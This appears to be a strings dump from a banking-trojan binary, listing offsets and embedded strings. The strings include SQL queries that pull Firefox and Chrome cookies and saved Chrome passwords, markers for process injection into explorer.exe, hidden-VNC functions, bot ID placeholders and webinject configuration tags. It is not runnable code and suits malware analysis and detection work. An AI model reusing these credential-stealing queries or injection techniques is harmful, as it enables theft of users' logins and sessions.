64dd4,"*/*"
64dd8,"GET"
64ddc,"POST"
64de1,"HTTP/1.1"
64df0,"Connection: close\n"
65940,"HTTP/%d.%d %d OK\n"
659c2,"Content-Length"
659d1,"%d"
659b0,"Transfer-Encoding"
659c2,"Content-Length"
659d1,"%d"
659e0,"Content-Security-Policy"
65a00,"X-Content-Security-Policy"
65a1a,"X-Frame-Options"
65a30,"X-Permitted-Cross-Domain-Policies"
65a60,"Content-Security-Policy-Report-Only"
65920,"%s %s HTTP/%d.%d\n"
65980,"if-modified-since"
65992,"te"
65995,"accept-encoding"
659a5,"gzip"
65282,": "
65b1c,"content-length"
651f2,"content-type"
66330,"multipart/form-data"
66350,"application/octet-stream"
65728,"GetTEB64"
65731,"GetMem64"
65731,"GetMem64"
65731,"GetMem64"
65731,"GetMem64"
65731,"GetMem64"
65940,"HTTP/%d.%d %d OK\n"
65920,"%s %s HTTP/%d.%d\n"
65282,": "
6542f,"127.0.0.1"
65b33,"connection"
66370,"proxy-connection"
65b1c,"content-length"
65960,"transfer-encoding"
65b2b,"upgrade"
65972,"chunked"
66381,"keep-alive"
65b3e,"close"
65b2b,"upgrade"
6678b,"INVALID FILE"
65767,"X64Call"
6542f,"127.0.0.1"
6542f,"127.0.0.1"
652c4,"%BOTID%"
652cc,"%BOTNET%"
652d5,"%RAND%"
651d0,"application/x-www-form-urlencoded"
651f2,"content-type"
651ff,"Authorization"
65220,"*BIG_SIZE_OF_POST_DATA*"
65282,": "
65960,"transfer-encoding"
65972,"chunked"
665f0,"select  `host`, `name`, `value`, `path`, `expiry`, `isSecure`, `isHttpOnly`, `sameSite` from `moz_cookies`"
65160,"-----BEGIN CERTIFICATE-----\n"
65180,"-----END CERTIFICATE-----"
669b6,"LdrLoadDll"
65767,"X64Call"
669d0,"CreateRemoteThread"
66900,"Get image32 failed."
66920,"Get image64 failed."
64d80,"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET4.0C; .NET4.0E)"
669f0,"Can't inject to explorer."
6678b,"INVALID FILE"
65447,"OK."
667e0,"RtlUserThreadStart"
66800,"NtCreateUserProcess"
66814,"NtCreateThread"
66830,"ZwDeviceIoControlFile"
66870,"TranslateMessage"
64bed,"crypt32.dll"
66890,"CertGetCertificateChain"
668b0,"CertVerifyCertificateChainPolicy"
667c0,"Inject to explorer success."
666e0,"select `host_key`, `name`, `encrypted_value`, `path`, `expires_utc`, `is_secure`, `is_httponly` from `cookies`"
65904,"host"
65909,"http://"
65911,"https://"
664e0,"Host: %s\n%s=%s\nPath: %s\nExpiry: %u\nIsSecure: %s\nIsHttpOnly: %s\nSameSite: %d\n"
6652d,"true"
66532,"false"
66538,"/"
6542f,"127.0.0.1"
6519a,"CN="
65909,"http://"
64ce4,"aeiouy"
64cf0,"bcdfghklmnpqrstvwxz"
64cf0,"bcdfghklmnpqrstvwxz"
64ce4,"aeiouy"
64cf0,"bcdfghklmnpqrstvwxz"
64ce4,"aeiouy"
64cf0,"bcdfghklmnpqrstvwxz"
65b44,"%x\n"
65b49,"0\n\n"
64c90,"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
64c90,"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
64c90,"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
64c90,"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
66e10,"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36"
64b9c,"kernel32.dll"
65b50,"content-encoding"
659a5,"gzip"
66320,"6.3"
651a6,"C"
651a8,"O"
6519e,"CN"
651b0,"critical,CA:TRUE"
65b1c,"content-length"
65b2b,"upgrade"
65b33,"connection"
65b3e,"close"
651f2,"content-type"
65b61,"audio/"
65b68,"video/"
65b6f,"model/"
65b76,"image/"
65b7d,"application/"
65b8a,"json/"
65b90,"javascript/"
65b1c,"content-length"
6519e,"CN"
651a1,"DNS:"
6542f,"127.0.0.1"
657b0,"NtProtectVirtualMemory"
65767,"X64Call"
657d0,"NtWriteVirtualMemory"
65767,"X64Call"
65770,"NtAllocateVirtualMemory"
65767,"X64Call"
65790,"NtFreeVirtualMemory"
65767,"X64Call"
65767,"X64Call"
65731,"GetMem64"
65731,"GetMem64"
65731,"GetMem64"
65731,"GetMem64"
65731,"GetMem64"
65731,"GetMem64"
6573a,"CmpMem64"
65750,"LdrGetProcedureAddress"
65750,"LdrGetProcedureAddress"
64e08,"br"
64e0b,"hr"
64e0e,"tr"
64e11,"td"
64e14,"div"
64e18,"h1"
64e1b,"h2"
64e1e,"h3"
64e21,"h4"
64e24,"h5"
64e27,"h6"
64e2a,"li"
64e2d,"script"
64e34,"nbsp;"
64e2d,"script"
64e11,"td"
65420,"VncStartServer"
6542f,"127.0.0.1"
65439,"VncStopServer"
64e3a,".dll"
64fc5,"1.2.5"
65390,"select `origin_url`, `username_value`, `password_value` FROM logins"
653d4,"Url: "
653da,"Username: "
653e5,"Password: "
64fc5,"1.2.5"
64f90,"ZwMapViewOfSection"
64fa3,"mshtml.dll"
64fb0,"msi=%x load-image=%x"
64e04,"/%s"
6674f,"set_url"
6674f,"set_url"
66757,"data_before\n"
66765,"data_inject\n"
66780,"data_end\n"
66773,"data_after\n"
